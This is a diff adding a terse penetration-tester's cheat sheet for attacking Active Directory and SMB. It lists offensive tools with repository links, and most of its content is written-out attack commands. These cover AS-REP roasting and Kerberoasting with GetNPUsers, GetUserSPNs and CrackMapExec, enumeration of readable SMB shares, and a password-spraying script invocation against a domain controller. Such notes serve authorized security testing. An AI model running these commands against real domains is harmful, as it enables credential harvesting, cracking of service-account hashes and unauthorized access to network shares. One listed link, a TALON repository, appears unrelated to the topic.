@@ -1,1 +1,42 @@
+===========================================
+Active Directory
+===========================================
+nmap
+
+
+kerbrute
+https://github.com/ropnop/kerbrute.git
+
+
+talon
+https://github.com/mortazavilab/TALON.git
+
+
+ASREProast (no creds needed (but needs users))
+GetNPUsers.py 
+cme ldap dc-ip -d domain.com -u user -p 'pass' --asreproastable asreproasts.txt
+
+
+Kerberoasts (need creds)
+GetUserSPNs.py
+cme ldap dc-ip -d domain.com -u user -p 'pass' --kerberoastable kerberoasts.txt
+
+
+===========================================
+SMB
+===========================================
+----SMBeagle
+    https://github.com/punk-security/smbeagle.git
+*********SMBealge -d domain.com -u user -p 'pass' ip
+
+----Crackmap
+    https://github.com/Porchetta-Industries/CrackMapExec
+    https://www.crackmapexec.wiki/
+*********cme smb ip -d domain.com -u user -p 'pass' --shares --log shares.log
+        grep -ai 'read' shares.log | grep -avi 'print\$' | grep -avi 'ipc\$' > readable-shares.txt
+
+----Password sprays  
+      https://github.com/counter-sec/EZ-Crackmap/blob/main/spraygun.sh
+*********./spraygun.sh dc-ip userlist.txt passwords.txt sleep-in-mins
+            - defaults to 2x per sleep
 
